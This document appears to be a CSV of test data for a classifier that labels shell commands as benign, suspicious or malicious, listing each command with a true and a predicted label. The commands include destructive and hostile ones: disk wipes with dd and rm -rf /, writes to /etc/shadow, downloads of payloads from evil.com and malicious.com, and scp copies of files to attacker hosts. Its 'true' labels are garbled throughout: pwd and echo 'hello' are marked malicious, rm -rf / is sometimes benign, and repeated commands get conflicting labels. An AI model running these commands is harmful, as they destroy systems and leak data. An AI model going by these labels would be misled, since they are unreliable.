command,true_label,predicted_label
cd /root,SUSPICIOUS,BENIGN
echo 'owned' >> /etc/shadow,MALICIOUS,BENIGN
find / -name 'test',SUSPICIOUS,BENIGN
sudo su,MALICIOUS,SUSPICIOUS
cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
whoami,BENIGN,SUSPICIOUS
whoami,MALICIOUS,BENIGN
scp data.tar.gz root@192.168.0.2:/tmp/,SUSPICIOUS,BENIGN
curl https://suspicious.org/exploit.zip,SUSPICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
pwd,MALICIOUS,BENIGN
echo 'hello',SUSPICIOUS,BENIGN
ping google.com,MALICIOUS,BENIGN
echo 'pwned' > /root/.bashrc,SUSPICIOUS,BENIGN
sudo apt install htop,MALICIOUS,BENIGN
 cat /var/log/auth.log,MALICIOUS,BENIGN
rm -rf /home/user,SUSPICIOUS,MALICIOUS
cat /etc/shadow ,SUSPICIOUS,BENIGN
curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
echo 'hacked' > /etc/shadow,SUSPICIOUS,MALICIOUS
cat readme.md,SUSPICIOUS,BENIGN
grep 'password' /etc/passwd,BENIGN,MALICIOUS
sudo   apt install nmap,SUSPICIOUS,BENIGN
top -n 1,SUSPICIOUS,MALICIOUS
netstat   -tulnp,BENIGN,SUSPICIOUS
cat /var/log/syslog,SUSPICIOUS,BENIGN
scp file.txt admin@malicious.com:/var/www,BENIGN,MALICIOUS
sudo su,MALICIOUS,BENIGN
wget http://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
echo 'hello world',MALICIOUS,BENIGN
touch homework.doc,MALICIOUS,BENIGN
ps aux | grep mysql,SUSPICIOUS,BENIGN
df   -h,SUSPICIOUS,BENIGN
ifconfig,MALICIOUS,BENIGN
pwd,MALICIOUS,BENIGN
iptables -F,SUSPICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,SUSPICIOUS,MALICIOUS
curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
netstat -tulnp,MALICIOUS,BENIGN
cat /etc/shadow,MALICIOUS,BENIGN
ls /var/www,MALICIOUS,BENIGN
cat   /var/log/auth.log,SUSPICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
wget http://suspicious.org/exploit.zip,SUSPICIOUS,MALICIOUS
curl -O http://suspicious.org/update.bin,SUSPICIOUS,MALICIOUS
curl -O   http://suspicious.org/update.bin,SUSPICIOUS,BENIGN
rm -rf /var/,SUSPICIOUS,BENIGN
rm -rf /,MALICIOUS,SUSPICIOUS
sudo -l,SUSPICIOUS,BENIGN
LS /VAR/WWW,SUSPICIOUS,BENIGN
cd /var/www,MALICIOUS,BENIGN
sudo apt   update,BENIGN,SUSPICIOUS
cat welcome.txt,BENIGN,SUSPICIOUS
whoami,SUSPICIOUS,MALICIOUS
ls /root/,SUSPICIOUS,BENIGN
pwd,MALICIOUS,BENIGN
sudo apt update,MALICIOUS,BENIGN
ps aux | grep mysql,SUSPICIOUS,MALICIOUS
CAT /ETC/SHADOW ,SUSPICIOUS,BENIGN
ls   -al,BENIGN,SUSPICIOUS
SCP BACKUP.SQL ADMIN@192.168.0.2:/ROOT/,BENIGN,MALICIOUS
rm -rf /* --no-preserve-root,SUSPICIOUS,MALICIOUS
ps aux,MALICIOUS,SUSPICIOUS
cat /root/.bashrc,SUSPICIOUS,BENIGN
mv /bin/bash /tmp/bash,MALICIOUS,SUSPICIOUS
grep root /etc/passwd,MALICIOUS,BENIGN
cat   ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
du -sh,SUSPICIOUS,BENIGN
ECHO 'HELLO WORLD',SUSPICIOUS,BENIGN
grep root /etc/passwd,MALICIOUS,SUSPICIOUS
echo 'owned' > /var/log/syslog,MALICIOUS,BENIGN
PS AUX | GREP MYSQL,SUSPICIOUS,BENIGN
du -sh,BENIGN,MALICIOUS
SCP   FILE.TXT ATTACKER@REMOTE:/TMP/,MALICIOUS,BENIGN
history,MALICIOUS,SUSPICIOUS
ps aux | grep sshd,MALICIOUS,BENIGN
rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
scp file.txt admin@192.168.0.2:/tmp/,MALICIOUS,BENIGN
df -h,MALICIOUS,BENIGN
CHMOD 777 /VAR/LOG/SYSLOG,MALICIOUS,BENIGN
sudo -l,SUSPICIOUS,BENIGN
touch homework.doc,MALICIOUS,BENIGN
WGET   HTTP://FILESHARE.COM/UPDATE.BIN,MALICIOUS,BENIGN
cat welcome.txt,SUSPICIOUS,BENIGN
pwd,MALICIOUS,BENIGN
rm -rf /var/,SUSPICIOUS,BENIGN
mv /bin/bash   /tmp/bash,SUSPICIOUS,BENIGN
curl -o   http://malicious.com/malware.bin,SUSPICIOUS,MALICIOUS
curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
cat   homework.txt,MALICIOUS,BENIGN
WGET HTTP://MALICIOUS.COM/PAYLOAD.SH,SUSPICIOUS,BENIGN
chmod 777 /etc/shadow,MALICIOUS,BENIGN
cat homework.txt,SUSPICIOUS,BENIGN
WGET   HTTP://FILESHARE.COM/EXPLOIT.ZIP,SUSPICIOUS,BENIGN
iptables -f ,MALICIOUS,BENIGN
PS AUX ,MALICIOUS,BENIGN
touch homework.doc,MALICIOUS,BENIGN
cat /etc/shadow,SUSPICIOUS,MALICIOUS
SUDO -L,SUSPICIOUS,BENIGN
curl -O   http://malicious.com/malware.bin,MALICIOUS,SUSPICIOUS
chmod 777   /root/.bashrc,MALICIOUS,SUSPICIOUS
ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
history,MALICIOUS,BENIGN
grep root /etc/passwd,MALICIOUS,SUSPICIOUS
curl http://unknown.site/script.sh,MALICIOUS,BENIGN
curl https://fileshare.com/update.bin ,MALICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
ping   google.com,MALICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
echo 'hello',MALICIOUS,BENIGN
curl -O   http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
echo 'owned'   >> /var/log/syslog,MALICIOUS,BENIGN
echo 'pwned' >> /etc/shadow,SUSPICIOUS,BENIGN
ls /var/www,SUSPICIOUS,BENIGN
curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
CAT /HOME/USER/TODO.TXT,BENIGN,SUSPICIOUS
ls /tmp/,SUSPICIOUS,BENIGN
wget http://fileshare.com/update.bin,MALICIOUS,BENIGN
mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
echo 'pwned' > /root/.bashrc,MALICIOUS,BENIGN
uname -a,SUSPICIOUS,BENIGN
chmod 777 /etc/shadow,MALICIOUS,BENIGN
curl -O http://suspicious.org/payload.sh,MALICIOUS,BENIGN
echo 'hello world' ,BENIGN,MALICIOUS
wget http://evil.com/payload.sh,BENIGN,SUSPICIOUS
ls -al,SUSPICIOUS,MALICIOUS
sudo -l,MALICIOUS,BENIGN
cat /var/log/syslog,MALICIOUS,BENIGN
echo 'pwned' > /root/.bashrc,SUSPICIOUS,MALICIOUS
echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
mkdir test,MALICIOUS,SUSPICIOUS
ps aux | grep sshd,SUSPICIOUS,BENIGN
cat   /home/user/info.txt,SUSPICIOUS,BENIGN
GREP 'PASSWORD' /ETC/PASSWD,MALICIOUS,BENIGN
sudo apt   update,BENIGN,MALICIOUS
grep   'password' /etc/passwd,SUSPICIOUS,BENIGN
 cat /etc/passwd,SUSPICIOUS,MALICIOUS
cd /tmp/ ,SUSPICIOUS,BENIGN
chmod 777 /etc/shadow,MALICIOUS,BENIGN
ls   /root/,BENIGN,SUSPICIOUS
echo 'pwned' > /root/.bashrc,MALICIOUS,SUSPICIOUS
sudo   su,SUSPICIOUS,BENIGN
echo 'owned' >> /etc/shadow,MALICIOUS,BENIGN
ls /root/,MALICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
sudo su,SUSPICIOUS,BENIGN
curl -O http://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
echo 'owned' >> /var/log/syslog,BENIGN,SUSPICIOUS
echo 'hello world',MALICIOUS,SUSPICIOUS
echo 'hello world' ,BENIGN,MALICIOUS
curl -O   http://suspicious.org/payload.sh,SUSPICIOUS,BENIGN
GREP   ROOT /ETC/PASSWD,SUSPICIOUS,BENIGN
cd /root,MALICIOUS,BENIGN
GREP   ROOT /ETC/PASSWD,SUSPICIOUS,BENIGN
cat notes.txt,MALICIOUS,BENIGN
grep 'password' /etc/passwd,MALICIOUS,BENIGN
env,MALICIOUS,BENIGN
sudo apt install htop,SUSPICIOUS,BENIGN
sudo apt update,MALICIOUS,BENIGN
grep root /etc/passwd,MALICIOUS,BENIGN
ls   -al,SUSPICIOUS,BENIGN
PS AUX   | GREP SSHD,MALICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
sudo su,MALICIOUS,BENIGN
chmod 777 /etc/shadow ,SUSPICIOUS,MALICIOUS
echo 'malware' > /tmp/malware.sh,BENIGN,SUSPICIOUS
echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
cat /home/user/info.txt,MALICIOUS,BENIGN
cat .bashrc,MALICIOUS,BENIGN
echo 'owned' >> /var/log/syslog,SUSPICIOUS,BENIGN
scp data.tar.gz user@192.168.0.2:/var/www,MALICIOUS,BENIGN
chmod 777 /var/log/syslog,MALICIOUS,BENIGN
cat ~/.ssh/known_hosts ,MALICIOUS,BENIGN
wget http://evil.com/payload.sh,SUSPICIOUS,MALICIOUS
netstat -tulnp,SUSPICIOUS,BENIGN
 CAT WELCOME.TXT,MALICIOUS,BENIGN
df -h,SUSPICIOUS,MALICIOUS
which python,MALICIOUS,BENIGN
cat welcome.txt,MALICIOUS,BENIGN
mv /bin/bash /tmp/bash,SUSPICIOUS,MALICIOUS
grep root /etc/passwd,MALICIOUS,BENIGN
CAT /HOME/USER/INFO.TXT,MALICIOUS,BENIGN
history,SUSPICIOUS,BENIGN
cat /etc/passwd,MALICIOUS,BENIGN
CAT /ETC/SHADOW,SUSPICIOUS,BENIGN
ping google.com,MALICIOUS,SUSPICIOUS
curl https://suspicious.org/update.bin,MALICIOUS,BENIGN
echo 'hello world',SUSPICIOUS,MALICIOUS
netstat   -tulnp,MALICIOUS,SUSPICIOUS
echo 'owned' >> /root/.bashrc,SUSPICIOUS,BENIGN
ECHO 'MALWARE'   > /TMP/MALWARE.SH,MALICIOUS,SUSPICIOUS
curl -O http://evil.com/update.bin,MALICIOUS,BENIGN
ps aux | grep nginx,SUSPICIOUS,BENIGN
curl -O http://evil.com/payload.sh,MALICIOUS,BENIGN
curl https://suspicious.org/exploit.zip,SUSPICIOUS,BENIGN
pwd,MALICIOUS,BENIGN
cat homework.txt,MALICIOUS,BENIGN
cat welcome.txt,SUSPICIOUS,BENIGN
sudo apt update,SUSPICIOUS,BENIGN
cat homework.txt,MALICIOUS,BENIGN
ls /var/www ,MALICIOUS,BENIGN
history,SUSPICIOUS,BENIGN
 ps aux | grep nginx,BENIGN,SUSPICIOUS
echo 'owned' > /etc/shadow,MALICIOUS,SUSPICIOUS
cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
ifconfig ,SUSPICIOUS,BENIGN
 curl -O http://malicious.com/malware.bin,SUSPICIOUS,MALICIOUS
cat welcome.txt,SUSPICIOUS,BENIGN
touch homework.doc,SUSPICIOUS,BENIGN
wget http://suspicious.org/update.bin,SUSPICIOUS,BENIGN
netstat -tulnp,SUSPICIOUS,BENIGN
curl -O http://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
wget http://fileshare.com/update.bin ,MALICIOUS,BENIGN
cat /root/.bashrc,BENIGN,SUSPICIOUS
chmod 777   /var/log/syslog,MALICIOUS,SUSPICIOUS
sudo apt install htop,SUSPICIOUS,BENIGN
grep root /etc/passwd,MALICIOUS,SUSPICIOUS
echo 'hello',SUSPICIOUS,BENIGN
cat welcome.txt,SUSPICIOUS,BENIGN
cat /home/user/todo.txt,SUSPICIOUS,MALICIOUS
curl -O http://suspicious.org/update.bin,MALICIOUS,BENIGN
cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
CAT /ETC/PASSWD,MALICIOUS,BENIGN
curl -O http://suspicious.org/exploit.zip,MALICIOUS,BENIGN
chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
cat /var/log/auth.log ,BENIGN,MALICIOUS
echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
du   -sh,SUSPICIOUS,BENIGN
watch netstat -an,MALICIOUS,BENIGN
LS /ROOT/,SUSPICIOUS,BENIGN
du -sh,SUSPICIOUS,BENIGN
ls -al,SUSPICIOUS,BENIGN
ps aux | grep   mysql,SUSPICIOUS,BENIGN
sudo -l,MALICIOUS,SUSPICIOUS
pwd,BENIGN,MALICIOUS
sudo -l,MALICIOUS,BENIGN
scp   file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
which python,MALICIOUS,SUSPICIOUS
mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
CD /VAR/WWW,BENIGN,MALICIOUS
cat .bashrc,SUSPICIOUS,MALICIOUS
cat .bashrc,MALICIOUS,BENIGN
wget http://malicious.com/payload.sh,BENIGN,MALICIOUS
curl   -O http://suspicious.org/payload.sh,SUSPICIOUS,BENIGN
sudo -l,SUSPICIOUS,BENIGN
cat .bashrc,SUSPICIOUS,BENIGN
cat   /var/log/auth.log,MALICIOUS,BENIGN
cat /etc/passwd,SUSPICIOUS,BENIGN
echo 'owned' >> /etc/shadow,SUSPICIOUS,BENIGN
ls -al,MALICIOUS,BENIGN
mkdir test,MALICIOUS,BENIGN
ps aux | grep mysql,MALICIOUS,BENIGN
ps aux | grep mysql,SUSPICIOUS,BENIGN
ls -al,SUSPICIOUS,MALICIOUS
ECHO 'HACKED' >   /ROOT/.BASHRC,MALICIOUS,BENIGN
grep 'password' /etc/passwd,MALICIOUS,SUSPICIOUS
rm -rf /var/,MALICIOUS,BENIGN
du -sh,SUSPICIOUS,BENIGN
chmod 777 /etc/shadow,BENIGN,MALICIOUS
ls /tmp/,MALICIOUS,BENIGN
cat /etc/shadow,MALICIOUS,SUSPICIOUS
curl -O http://fileshare.com/payload.sh ,MALICIOUS,BENIGN
echo   'pwned' > /etc/shadow,BENIGN,MALICIOUS
top -n 1 ,SUSPICIOUS,BENIGN
cat welcome.txt,MALICIOUS,BENIGN
cd /root,SUSPICIOUS,BENIGN
rm -rf /,MALICIOUS,BENIGN
chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
cat notes.txt,MALICIOUS,BENIGN
cat /home/user/todo.txt,SUSPICIOUS,BENIGN
cat   homework.txt,SUSPICIOUS,MALICIOUS
wget http://fileshare.com/update.bin,MALICIOUS,BENIGN
iptables -F,SUSPICIOUS,BENIGN
PS AUX | GREP NGINX,SUSPICIOUS,BENIGN
curl -O http://malicious.com/malware.bin,MALICIOUS,SUSPICIOUS
iptables -F,MALICIOUS,BENIGN
curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
ifconfig,MALICIOUS,BENIGN
echo 'hello',MALICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,MALICIOUS,SUSPICIOUS
cat homework.txt,MALICIOUS,BENIGN
chmod 777 /root/.bashrc,MALICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
GREP 'PASSWORD'   /ETC/PASSWD,SUSPICIOUS,BENIGN
CAT /ETC/SHADOW,MALICIOUS,BENIGN
whoami,MALICIOUS,BENIGN
cat /etc/shadow ,MALICIOUS,BENIGN
curl -O http://fileshare.com/update.bin,BENIGN,MALICIOUS
curl -O http://fileshare.com/update.bin,MALICIOUS,BENIGN
grep root /etc/passwd,MALICIOUS,BENIGN
echo 'owned' >> /root/.bashrc,BENIGN,SUSPICIOUS
cd /root,MALICIOUS,BENIGN
history,MALICIOUS,BENIGN
ps aux,SUSPICIOUS,BENIGN
rm -rf /home/user,MALICIOUS,BENIGN
rm -rf /,MALICIOUS,BENIGN
TOUCH HOMEWORK.DOC ,SUSPICIOUS,BENIGN
grep   root /etc/passwd,MALICIOUS,BENIGN
cat homework.txt,MALICIOUS,BENIGN
echo 'pwned' >> /etc/shadow,MALICIOUS,BENIGN
ps aux,SUSPICIOUS,BENIGN
echo 'hello',MALICIOUS,SUSPICIOUS
wget   http://evil.com/exploit.zip,MALICIOUS,BENIGN
chmod 777 /var/log/syslog,MALICIOUS,SUSPICIOUS
sudo apt install nmap,BENIGN,MALICIOUS
history,SUSPICIOUS,BENIGN
rm -rf /var/,SUSPICIOUS,MALICIOUS
curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
ping google.com,MALICIOUS,BENIGN
cd /root/,SUSPICIOUS,BENIGN
 curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
scp data.tar.gz admin@192.168.0.2:/var/www,SUSPICIOUS,BENIGN
cat /etc/passwd,MALICIOUS,BENIGN
wget http://evil.com/payload.sh,MALICIOUS,BENIGN
SUDO APT INSTALL HTOP,BENIGN,MALICIOUS
CD /VAR/WWW,SUSPICIOUS,BENIGN
scp data.tar.gz user@malicious.com:/root/,MALICIOUS,BENIGN
cat welcome.txt,MALICIOUS,BENIGN
SUDO APT UPDATE,MALICIOUS,BENIGN
chmod 777 /etc/shadow,MALICIOUS,BENIGN
echo 'hacked'   >> /root/.bashrc,MALICIOUS,BENIGN
cat /etc/shadow,SUSPICIOUS,BENIGN
 chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
which python,SUSPICIOUS,BENIGN
curl   -O http://malicious.com/malware.bin,MALICIOUS,SUSPICIOUS
curl -O http://suspicious.org/update.bin,SUSPICIOUS,BENIGN
cat /home/user/info.txt ,MALICIOUS,BENIGN
iptables -F,BENIGN,MALICIOUS
sudo apt install nmap,SUSPICIOUS,BENIGN
 curl https://evil.com/update.bin,MALICIOUS,BENIGN
ECHO 'HACKED' > /VAR/LOG/SYSLOG,BENIGN,SUSPICIOUS
curl http://unknown.site/script.sh ,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,SUSPICIOUS,MALICIOUS
cat /var/log/syslog,SUSPICIOUS,BENIGN
 curl https://suspicious.org/update.bin,SUSPICIOUS,BENIGN
WATCH NETSTAT -AN ,MALICIOUS,BENIGN
cat   /home/user/todo.txt,SUSPICIOUS,BENIGN
uname -a ,BENIGN,MALICIOUS
CAT WELCOME.TXT,SUSPICIOUS,BENIGN
top -n 1,BENIGN,SUSPICIOUS
chmod   777 /var/log/syslog,SUSPICIOUS,BENIGN
cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
echo 'owned'   >> /root/.bashrc,SUSPICIOUS,BENIGN
ifconfig ,SUSPICIOUS,BENIGN
curl https://evil.com/exploit.zip,MALICIOUS,BENIGN
curl -O http://malicious.com/malware.bin,BENIGN,SUSPICIOUS
watch netstat -an,SUSPICIOUS,BENIGN
cd /root/,SUSPICIOUS,BENIGN
ls -al,SUSPICIOUS,BENIGN
df -h,SUSPICIOUS,MALICIOUS
cat /var/log/syslog,BENIGN,SUSPICIOUS
sudo apt install htop,BENIGN,SUSPICIOUS
history,SUSPICIOUS,BENIGN
ls /tmp/,MALICIOUS,BENIGN
top   -n 1,SUSPICIOUS,BENIGN
cat homework.txt,SUSPICIOUS,BENIGN
rm -rf   /,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
curl -O   http://malicious.com/malware.bin,MALICIOUS,SUSPICIOUS
rm -rf /,MALICIOUS,BENIGN
NETSTAT   -TULNP,MALICIOUS,BENIGN
ls /tmp/,MALICIOUS,BENIGN
echo 'owned' > /etc/shadow,SUSPICIOUS,BENIGN
cd /tmp/,BENIGN,SUSPICIOUS
cat /var/log/syslog,SUSPICIOUS,BENIGN
echo 'hacked' >> /root/.bashrc ,SUSPICIOUS,BENIGN
wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
scp backup.sql admin@192.168.0.2:/var/www,SUSPICIOUS,BENIGN
chmod 777 /etc/shadow,MALICIOUS,BENIGN
cat /etc/shadow,SUSPICIOUS,BENIGN
cat /var/log/auth.log,MALICIOUS,BENIGN
ls -al,MALICIOUS,BENIGN
echo 'hello',SUSPICIOUS,BENIGN
grep root /etc/passwd,MALICIOUS,BENIGN
wget http://suspicious.org/update.bin,BENIGN,MALICIOUS
watch netstat -an,MALICIOUS,SUSPICIOUS
scp file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
ps aux | grep mysql,SUSPICIOUS,BENIGN
cat notes.txt,MALICIOUS,BENIGN
grep root /etc/passwd,SUSPICIOUS,BENIGN
SUDO   APT UPDATE,MALICIOUS,BENIGN
grep 'password' /etc/passwd,SUSPICIOUS,BENIGN
echo 'hello',SUSPICIOUS,BENIGN
cd /tmp/,MALICIOUS,BENIGN
mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
find   / -name 'test',BENIGN,SUSPICIOUS
ls /var/www,MALICIOUS,BENIGN
ls   /root/,MALICIOUS,SUSPICIOUS
ps aux,BENIGN,SUSPICIOUS
dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
curl https://evil.com/exploit.zip,BENIGN,SUSPICIOUS
grep root /etc/passwd,SUSPICIOUS,BENIGN
touch homework.doc,BENIGN,MALICIOUS
echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
CURL   -O HTTP://EVIL.COM/PAYLOAD.SH,MALICIOUS,BENIGN
ping google.com,MALICIOUS,SUSPICIOUS
cat /etc/shadow,MALICIOUS,BENIGN
watch netstat -an,BENIGN,MALICIOUS
curl http://unknown.site/script.sh,MALICIOUS,BENIGN
cat /home/user/todo.txt,SUSPICIOUS,MALICIOUS
rm -rf /var/,MALICIOUS,SUSPICIOUS
wget   http://malicious.com/payload.sh,BENIGN,MALICIOUS
ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
cat   /home/user/todo.txt,SUSPICIOUS,MALICIOUS
wget http://fileshare.com/update.bin,MALICIOUS,BENIGN
cat /var/log/auth.log,SUSPICIOUS,MALICIOUS
rm   -rf /* --no-preserve-root,MALICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
du -sh,SUSPICIOUS,BENIGN
sudo apt install net-tools,BENIGN,MALICIOUS
 cat /etc/passwd,MALICIOUS,SUSPICIOUS
env,MALICIOUS,BENIGN
echo 'pwned' >> /etc/shadow,SUSPICIOUS,BENIGN
mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
GREP 'PASSWORD' /ETC/PASSWD,MALICIOUS,BENIGN
top -n 1,SUSPICIOUS,BENIGN
echo 'hacked' > /etc/shadow,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
curl   https://evil.com/payload.sh,SUSPICIOUS,BENIGN
cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
cat /etc/shadow,SUSPICIOUS,BENIGN
cd /root/,SUSPICIOUS,BENIGN
env,MALICIOUS,BENIGN
df -h,MALICIOUS,BENIGN
uname -a,MALICIOUS,BENIGN
cat /home/user/todo.txt,MALICIOUS,SUSPICIOUS
NETSTAT -TULNP,MALICIOUS,BENIGN
ping google.com,SUSPICIOUS,BENIGN
LS   /ROOT/,BENIGN,MALICIOUS
scp   file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
pwd,SUSPICIOUS,BENIGN
chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
curl   https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
echo 'hello world',MALICIOUS,BENIGN
cat /etc/passwd ,MALICIOUS,BENIGN
cat notes.txt ,MALICIOUS,SUSPICIOUS
cat notes.txt,SUSPICIOUS,BENIGN
watch netstat -an,SUSPICIOUS,BENIGN
echo 'hello',SUSPICIOUS,BENIGN
echo   'hello',SUSPICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
sudo apt update,SUSPICIOUS,BENIGN
chmod 777   /root/.bashrc,MALICIOUS,BENIGN
history,MALICIOUS,BENIGN
chmod   777 /var/log/syslog,SUSPICIOUS,BENIGN
cat /root/.bashrc,MALICIOUS,BENIGN
cat /etc/shadow,MALICIOUS,BENIGN
rm -rf /* --no-preserve-root,BENIGN,MALICIOUS
cat /var/log/syslog,SUSPICIOUS,BENIGN
cd /var/www,SUSPICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
cd /var/www,SUSPICIOUS,BENIGN
cat   /etc/shadow,SUSPICIOUS,BENIGN
cat /root/.bashrc,SUSPICIOUS,MALICIOUS
echo   'hello',SUSPICIOUS,BENIGN
cd /root,MALICIOUS,BENIGN
cat /var/log/auth.log,SUSPICIOUS,MALICIOUS
cd /root,MALICIOUS,BENIGN
cat /etc/shadow,MALICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,MALICIOUS
echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
curl https://suspicious.org/exploit.zip ,MALICIOUS,BENIGN
cat welcome.txt,SUSPICIOUS,MALICIOUS
find / -name 'test',MALICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
rm -rf /,SUSPICIOUS,BENIGN
PS AUX | GREP NGINX,SUSPICIOUS,BENIGN
mv /bin/bash /tmp/bash ,BENIGN,MALICIOUS
CAT /ETC/SHADOW,MALICIOUS,BENIGN
sudo -l,MALICIOUS,BENIGN
ifconfig,MALICIOUS,BENIGN
df -h,SUSPICIOUS,BENIGN
echo 'pwned' > /etc/shadow,MALICIOUS,BENIGN
grep root   /etc/passwd,MALICIOUS,SUSPICIOUS
which   python,MALICIOUS,BENIGN
scp file.txt root@backup.server:/root/,MALICIOUS,BENIGN
which python,SUSPICIOUS,MALICIOUS
cat /etc/shadow,SUSPICIOUS,BENIGN
cat .bashrc,MALICIOUS,BENIGN
rm -rf /,SUSPICIOUS,BENIGN
whoami,MALICIOUS,BENIGN
cat readme.md,MALICIOUS,SUSPICIOUS
top   -n 1,SUSPICIOUS,BENIGN
cd /root,MALICIOUS,BENIGN
cat /home/user/info.txt,MALICIOUS,SUSPICIOUS
rm -rf   /home/user,SUSPICIOUS,BENIGN
cd   /root/,SUSPICIOUS,BENIGN
ifconfig,MALICIOUS,SUSPICIOUS
wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
mv /bin/bash /tmp/bash,BENIGN,SUSPICIOUS
ps aux | grep sshd,MALICIOUS,BENIGN
 chmod 777 /var/log/syslog,MALICIOUS,BENIGN
which python,SUSPICIOUS,MALICIOUS
curl https://suspicious.org/update.bin,SUSPICIOUS,BENIGN
mkdir   test,SUSPICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
ls /var/www,SUSPICIOUS,BENIGN
cat .bashrc,MALICIOUS,BENIGN
rm -rf /var/,SUSPICIOUS,BENIGN
cat /home/user/info.txt,MALICIOUS,SUSPICIOUS
cat readme.md,MALICIOUS,BENIGN
cd /root/,SUSPICIOUS,BENIGN
